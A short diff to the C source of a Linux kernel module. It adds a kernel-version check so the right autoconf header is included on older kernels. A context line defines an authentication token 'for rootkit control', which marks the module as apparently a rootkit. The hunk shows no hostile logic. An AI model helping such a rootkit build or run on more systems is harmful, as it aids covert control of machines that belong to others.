@@ -5,7 +5,11 @@
 #include <linux/slab.h>
 #include <linux/list.h>
 #include <linux/fs.h>
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
 #include <generated/autoconf.h>
+#else
+#include <linux/autoconf.h>
+#endif
 
 #define AUTH_TOKEN 0x12345678   // Authentication token for rootkit control
 #define __DEBUG__ 1             // General debugging statements
